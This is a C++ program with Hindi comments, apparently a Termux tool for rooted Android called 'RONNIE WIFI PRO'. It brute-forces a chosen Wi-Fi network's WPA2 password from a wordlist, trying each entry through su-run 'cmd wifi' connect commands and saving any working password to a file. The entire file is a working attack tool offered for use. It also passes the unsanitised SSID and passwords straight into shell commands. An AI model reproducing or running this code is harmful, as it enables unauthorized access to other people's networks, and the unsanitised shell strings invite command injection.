#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>
#include <vector>
#include <algorithm>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

// फंक्शन यह चेक करने के लिए कि क्या वाई-फाई कनेक्ट हो गया है
bool isConnected(string ssid) {
    // dumpsys कमांड का आउटपुट टेम्परेरी फाइल में लें
    string check_cmd = "su -c 'dumpsys wifi | grep \"mWifiInfo\"' > temp_res.txt";
    system(check_cmd.c_str());
    
    ifstream res("temp_res.txt");
    string line;
    bool connected = false;
    
    if (res.is_open()) {
        while (getline(res, line)) {
            // FIX: string::npos की जगह size_t(-1) का उपयोग जो हर जगह चलता है
            if (line.find(ssid) != (size_t)(-1) && line.find("completed") != (size_t)(-1)) {
                connected = true;
                break;
            }
        }
        res.close();
    }
    return connected;
}

int main() {
    // स्क्रीन साफ़ करें
    system("clear");
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "      RONNIE WIFI PRO (TERMUX FINAL FIX)   " << endl;
    cout << "===========================================" << RESET << endl;

    // 1. स्कैनिंग कमांड
    cout << YELLOW << "[*] Scanning Nearby Networks..." << RESET << endl;
    cout << "-------------------------------------------" << endl;
    // nmcli के बिना एंड्रॉइड स्पेसिफिक स्कैन
    system("su -c 'cmd wifi list-scan-results' | awk 'NR>1 {print $NF}' | sort -u");
    cout << "-------------------------------------------" << endl;

    string ssid, wordlist;
    cout << CYAN << "\nEnter Target SSID: " << RESET;
    // cin >> ws ताकि बफर साफ़ रहे
    if (!(cin >> ws)) return 0;
    getline(cin, ssid);

    cout << CYAN << "Wordlist Path (e.g. /sdcard/pass.txt): " << RESET;
    if (!(cin >> ws)) return 0;
    getline(cin, wordlist);

    ifstream file(wordlist.c_str());
    if (!file.is_open()) {
        cout << RED << "[-] Error: Wordlist file '" << wordlist << "' nahi khuli!" << RESET << endl;
        return 1;
    }

    string pass;
    int line_count = 0;
    bool success = false;

    cout << YELLOW << "\n[!] Starting Attack on " << ssid << "..." << RESET << endl;

    while (getline(file, pass)) {
        line_count++;
        
        // पासवर्ड से गैर-जरूरी कैरेक्टर्स (\r या \n) हटाना
        if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) {
            pass.erase(pass.size() - 1);
        }
        
        if (pass.length() < 8) continue;

        cout << CYAN << "[" << line_count << "][LEN: " << (int)pass.length() << "] " << RESET << "TRYING: " << pass << flush;

        // पुराने प्रोफाइल को रिसेट करना
        string forget = "su -c 'cmd wifi forget-network " + ssid + " > /dev/null 2>&1'";
        system(forget.c_str());

        // नया कनेक्शन प्रयास
        string connect_cmd = "su -c 'cmd wifi connect-network " + ssid + " wpa2 " + pass + "' > /dev/null 2>&1";
        system(connect_cmd.c_str());

        // एंड्रॉइड हैंडशेक के लिए इंतज़ार
        sleep(5); 

        // कनेक्शन स्टेटस चेक
        if (isConnected(ssid)) {
            cout << GREEN << " >> [SUCCESS!]" << RESET << endl;
            cout << GREEN << BOLD << "\n[+] SAHI PASSWORD MIL GAYA: " << pass << RESET << endl;
            
            // रिजल्ट सेव करना
            ofstream save("found_pass.txt", ios::app);
            if (save.is_open()) {
                save << "SSID: " << ssid << " | PASS: " << pass << endl;
                save.close();
            }
            
            success = true;
            break;
        } else {
            cout << RED << " >> [FAILED]" << RESET << endl;
        }
    }

    if (!success) cout << RED << "\n[-] Password nahi mila. Wordlist khatam." << RESET << endl;

    file.close();
    // कचरा फाइलें साफ़ करें
    system("rm -f temp_res.txt");
    return 0;
}
